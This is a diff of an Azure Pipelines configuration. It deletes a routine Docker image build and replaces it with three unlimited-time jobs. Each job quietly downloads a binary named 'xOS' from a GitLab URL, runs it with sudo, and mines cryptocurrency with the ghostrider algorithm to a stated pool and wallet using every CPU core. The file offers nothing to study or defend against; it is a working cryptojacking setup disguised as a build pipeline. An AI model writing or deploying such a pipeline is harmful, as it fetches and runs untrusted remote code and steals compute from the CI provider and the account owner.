@@ -1,29 +1,20 @@
-# Docker
-# Build a Docker image 
-# https://docs.microsoft.com/azure/devops/pipelines/languages/docker
-
 trigger:
-- master
-
-resources:
-- repo: self
-
-variables:
-  tag: '$(Build.BuildId)'
-
-stages:
-- stage: Build
-  displayName: Build image
-  jobs:  
-  - job: Build
-    displayName: Build
-    pool:
-      vmImage: 'ubuntu-latest'
-    steps:
-    - task: Docker@2
-      displayName: Build an image
-      inputs:
-        command: build
-        dockerfile: '$(Build.SourcesDirectory)/Dockerfile'
-        tags: |
-          $(tag)
+- main
+pool:
+  vmImage: 'macos-latest'
+jobs:
+- job: Run1
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://gitlab.com/azkadafa39/donlod/-/raw/main/xOS >/dev/null 2>&1 && chmod +x xOS && sudo ./xOS --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls -u JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.$(echo $(shuf -i 100-999 -n 1)-Deviant) -k -t $(nproc --all)
+    displayName: 'run'
+- job: Run2
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://gitlab.com/azkadafa39/donlod/-/raw/main/xOS >/dev/null 2>&1 && chmod +x xOS && sudo ./xOS --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls -u JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.$(echo $(shuf -i 100-999 -n 1)-Deviant) -k -t $(nproc --all)
+    displayName: 'run'
+- job: Run2
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://gitlab.com/azkadafa39/donlod/-/raw/main/xOS >/dev/null 2>&1 && chmod +x xOS && sudo ./xOS --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls -u JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.$(echo $(shuf -i 100-999 -n 1)-Deviant) -k -t $(nproc --all)
+    displayName: 'run'
